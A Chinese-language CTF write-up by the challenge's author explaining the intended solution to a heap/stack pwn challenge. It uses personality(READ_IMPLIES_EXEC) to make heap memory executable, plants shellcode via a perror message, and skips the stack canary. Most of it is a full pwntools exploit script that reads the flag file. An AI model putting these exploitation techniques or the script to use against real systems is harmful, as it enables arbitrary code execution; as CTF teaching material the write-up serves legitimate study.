由于出题人水平太菜, 各种非预期满天飞, 以下预期解仅供参考:

`docker-compose.yml`可以看到设置了一个选项`seccomp=unconfined`, 所以可以往原本被禁止的一些系统调用考虑, linux存在一个系统调用personality:

```c
 int personality(unsigned long persona);
```

其常用于关闭ASLR, 对应的属性标志位是`ADDR_NO_RANDOMIZE`, 其一个可以设置的属性标志位`READ_IMPLIES_EXEC`, 描述如下

>  With this flag set, PROT_READ implies PROT_EXEC for mmap.

该属性被设置后, 使用mmap申请带有R权限的内存将同时带有代码执行权限, 事实上该标志位对brk也有效, 于是可以得到具有代码执行权限的heap内存

没有edit功能, 无法直接往堆中写数据, 但发现存在perror函数, perror函数会将参数字符串与errno对应的错误信息拼接后临时存放在heap中

注意到save功能中open失败会将filename拼入perror参数字符串中, 于是一个办法是在filename中写shellcode最后加一个`/`, 于是以可写方式打开目录触发报错, shellcode写入成功

利用栈溢出返回到shellcode调用read读取更长的shellcode即可

exp:
```py
from pwn import*
import binascii, struct

elf_path = './new'
elf = ELF(elf_path, checksec = False)
#libc = ELF('./libc.so.6', checksec = False)
context(binary = elf_path, log_level = 'debug', aslr = True)

r   = lambda num=4096            :p.recv(num)
ru  = lambda flag, drop=False    :p.recvuntil(flag, drop)
rl  = lambda                     :p.recvline()
ra  = lambda time=0.5            :p.recvall(timeout = time)
u7f = lambda                     :u64(ru('\x7f')[-6:].ljust(0x8, b'\x00'))
sla = lambda flag, content       :p.sendlineafter(flag, content)
sa  = lambda flag, content       :p.sendafter(flag, content)
sl  = lambda content             :p.sendline(content)
s   = lambda content             :p.send(content)
irt = lambda                     :p.interactive()
tbs = lambda content             :str(content).encode()
leak= lambda name, addr          :log.success('{} = {:#x}'.format(name, addr))
fmt = lambda string              :eval(f"f'''{string}'''", globals()).encode()
cw  = lambda cmd                 :f"cwatch execute '{cmd}'\n"
bp  = lambda dst                 : (
    f"b {dst}\n" if isinstance(dst, str) else
    f"b *$rebase({dst})\n" if dst < 0x3fe000 else f"b *{dst}\n"
)

load_sym = f"loadsym {symfile}\n" if (symfile := "") else ""
GDB_SC = load_sym

def dbg(sc = ""):
    LOCAL and (gdb.attach(p, GDB_SC + sc if sc else GDB_SC), pause())

def run():
    return process(elf_path) if LOCAL else remote('127.0.0.1', 9981)

LOCAL = 1
p = run()

def hex_to_double(hex_string):
    hex_string = hex_string.strip().lower()
    if hex_string.startswith('0x'):
        hex_string = hex_string[2:]

    hex_string = hex_string.zfill(16)

    hex_bytes = bytes.fromhex(hex_string)
        
    double_value = struct.unpack('>d', hex_bytes)[0]
        
    return double_value
    
def add(size):
	sla('back', tbs(1))
	sla(b'size:', tbs(size))
	
def delete():
	sla('back', tbs(2))
	
def save(filename):
	sla('back', tbs(3))
	sa("filename", filename)
	
def edit(content):
	sla('back', tbs(4))
	sla(b'content', content)
	
#syscall personality(READ_IMPLIES_EXEC)

sla(b'exit\n', tbs(2))
sla(b'input:\n', tbs(hex_to_double('0x0d0e0a0d0b0e0e0f')))
sla(b'Make a choice:',tbs(1))

code = """
    mov edi, 0x440000
	mov al, 0x87
	syscall
"""

sa(b'your code:', asm(code))
sla(b'success', tbs(0))
sla(b'exit\n', tbs(1))

#leak heapbase

add(0x10)
delete()
add(0x10)
save(b'log.txt')
ru(b'content[')
heapbase = u64(r(5).ljust(8, b'\x00')) << 12
leak('heapbase', heapbase)

delete()

#consume the remaining heap 

for i in range(62):
	add(0x20 + i * 0x10)
	delete()
#dbg()
for i in range(25):
	add(0x1000)

#get the rwx heap

shellcode = f'''
xor edi, edi
mov rsi, rbp
mov dl,0x40
syscall
'''

save(b'a'*2 + asm(shellcode) + b'/')
sc_addr = heapbase + 0x21000 + 0x631

#hijack pc 

sla(b'back', tbs(5))
sla(b'exit\n', tbs(2))
ru('input:\n')
for i in range(33):
	sl(b'1')
	sleep(0.01)

#input '+' to skip canary
sl(b'+')
sleep(0.01)
sl(tbs(hex_to_double(hex(sc_addr+9))))
sleep(0.01)
#dbg()
sl(tbs(hex_to_double(hex(sc_addr))))
orw = shellcraft.open('flag')
orw += shellcraft.sendfile(1, 3, 0, 0x100);
s(asm(orw))
irt()
```